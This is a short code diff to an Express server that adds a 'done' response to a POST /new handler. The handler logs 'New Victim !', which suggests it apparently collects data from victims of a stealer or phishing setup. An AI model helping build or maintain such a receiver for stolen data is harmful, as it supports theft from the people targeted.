@@ -31,6 +31,7 @@ app.post('/new', (req, res) => {
     if(err) return console.log(err);
     console.log("New Victim !")
   });
+  res.send("done")
 })
 
 const listener = app.listen(3000, () => {
